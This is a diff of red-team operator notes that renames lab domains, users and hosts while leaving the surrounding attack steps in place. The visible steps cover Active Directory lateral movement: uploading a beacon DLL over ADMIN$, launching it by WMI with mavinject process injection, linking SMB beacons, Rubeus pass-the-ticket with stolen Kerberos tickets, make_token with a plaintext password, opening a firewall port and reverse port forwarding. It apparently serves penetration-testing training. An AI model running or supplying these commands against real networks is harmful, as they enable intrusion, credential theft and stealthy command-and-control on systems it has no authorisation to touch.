@@ -21,8 +21,8 @@ Some login types do not store their credentials in LSASS on the remote machine. 
 ```
 Cached Tickets: (1)
 
-#0>	Client: rsteel @ CONTOSO.COM
-	Server: HTTP/lon-ws-1 @ CONTOSO.COM
+#0>	Client: tmorgan @ INLANEFREIGHT.LOCAL
+	Server: HTTP/ilf-ws-1 @ INLANEFREIGHT.LOCAL
 	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
 	Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize 
 	Start Time: 2/18/2025 10:43:31 (local)
@@ -80,9 +80,9 @@ cd \\abc-ws-1\ADMIN$\System32
 upload C:\Payloads\smb_x64.dll
 
 remote-exec wmi abc-ws-1 mavinject.exe 1992 /INJECTRUNNING C:\Windows\System32\smb_x64.dll
-Started process 1608 on lon-ws-1
+Started process 1608 on ilf-ws-1
 
-link lon-ws-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
+link ilf-ws-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
 [+] established link to child beacon: 10.10.120.10
 ```
 
@@ -100,7 +100,7 @@ mv \\abc-ws-1\ADMIN$\smb_x64.exe \\abc-ws-1\ADMIN$\hidden.exe
 ls \\abc-ws-1\ADMIN$
 
 remote-exec wmi abc-ws-1 C:\Windows\smb_x64.exe
-Started process 4548 on lon-ws-1
+Started process 4548 on ilf-ws-1
 
 link abc-ws-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
 ```
@@ -115,7 +115,7 @@ Make sure to add your targets to your hosts file for things like kerberos authen
 
 ```
 # Local ops station
-Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value '10.10.120.1 lon-dc-1'
+Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value '10.10.120.1 ilf-dc-1'
 ```
 
 ### Proxifier on Windows
@@ -132,7 +132,7 @@ You can then launch a tool such as `C:\Tools\SysinternalsSuite\ADExplorer64.exe`
 
 ```
 # Local ops station
-$Cred = Get-Credential CONTOSO.COM\ajohnson
+$Cred = Get-Credential INLANEFREIGHT.LOCAL\bjohnson
 Get-ADUser -Filter 'ServicePrincipalName -like "*"' -Credential $Cred -Server abc-dc-1
 ```
 
@@ -140,7 +140,7 @@ To leverage Kerberos tickets, start a new process with a fake password using `Ru
 
 ```
 # Local ops station
-C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /domain:CONTOSO.COM /username:ajohnson/password:FakePass /program:C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /ticket:C:\Users\ice-wzl\Desktop\rsteel.kirbi /show
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /domain:INLANEFREIGHT.LOCAL /username:bjohnson/password:FakePass /program:C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /ticket:C:\Users\ice-wzl\Desktop\tmorgan.kirbi /show
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
 ```
 
@@ -148,7 +148,7 @@ We also need to request service tickets manually, rather than relying on Windows
 
 ```
 # Local ops station
-C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/abc-dc-1 /ticket:C:\Users\ice-wzl\Desktop\ajohnson.kirbi /dc:abc-dc-1 /ptt
+C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:ldap/abc-dc-1 /ticket:C:\Users\ice-wzl\Desktop\bjohnson.kirbi /dc:abc-dc-1 /ptt
 
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
 Import-Module ActiveDirectory
@@ -164,7 +164,7 @@ rportfwd [bind port] [forward host] [forward port]
 First, add a firewall rule to allow port 28190 inbound.
 
 ```
-make_token CONTOSO\ajohnson Passw0rd!
+make_token INLANEFREIGHT\bjohnson Passw0rd!
 run netsh advfirewall firewall add rule name="Debug" dir=in action=allow protocol=TCP localport=28190
 rportfwd 28190 localhost 80
 remote-exec winrm abc-ws-1 iwr http://abc-wkstn-1:28190/test
